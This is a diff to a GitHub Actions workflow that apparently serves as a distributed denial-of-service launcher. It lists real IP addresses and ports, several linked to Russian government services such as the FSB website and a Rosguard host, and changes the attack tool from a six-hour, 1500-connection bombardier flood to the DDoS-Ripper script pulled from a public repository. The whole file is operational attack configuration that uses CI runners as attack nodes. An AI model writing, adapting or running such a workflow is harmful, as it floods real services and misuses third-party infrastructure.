@@ -8,13 +8,16 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        url: ['http://www.fsb.ru/', '213.24.76.25:1935', '213.24.76.25:8080', '195.218.193.189:5060', '95.173.148.51:5060', '95.173.148.51:554', 'https://ca.vks.rosguard.gov.ru/', '109.252.233.150:51']
+        site: ['213.24.76.25', '213.24.76.25', '195.218.193.189', '95.173.148.51', '95.173.148.51', '95.173.148.51', '95.173.148.50']
+        port: ['1935', '8080', '5060', '5060', '554', '53', '53']
     container:
       image: alpine/bombardier
 
     steps:
       - uses: actions/checkout@v2
+        with:
+          repository: palahsu/DDoS-Ripper
 
       - name: Run a multi-line script
         run: |
-          bombardier -c 1500 -d 21600s -l ${{ matrix.url }}
+          python DRipper.py -s ${{ matrix.site }} -p ${{ matrix.port }} -t 135 -q
